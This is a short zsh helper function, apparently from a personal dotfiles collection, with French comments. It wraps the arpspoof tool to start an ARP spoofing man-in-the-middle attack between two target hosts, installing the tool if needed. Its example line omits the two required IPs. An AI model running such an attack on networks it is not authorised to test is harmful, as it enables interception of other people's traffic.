# DESC: Lance une attaque ARP spoofing entre deux cibles
# USAGE: arp_spoof <interface> <ip_cible_1> <ip_cible_2>
# EXAMPLE: arp_spoof wlan0
arp_spoof() {
    # Vérifier et installer arpspoof si nécessaire
    UTILS_DIR="$HOME/dotfiles/zsh/functions/utils"
    if [ -f "$UTILS_DIR/ensure_tool.sh" ]; then
        source "$UTILS_DIR/ensure_tool.sh"
        ensure_tool arpspoof || return 1
    fi
    
    local interface="$1"
    local ip_cible_1="$2"
    local ip_cible_2="$3"
    
    if [ -z "$interface" ] || [ -z "$ip_cible_1" ] || [ -z "$ip_cible_2" ]; then
        echo "Usage: arp_spoof <interface> <ip_cible_1> <ip_cible_2>"
        return 1
    fi
    
    sudo arpspoof -i "$interface" -t "$ip_cible_1" "$ip_cible_2"
}
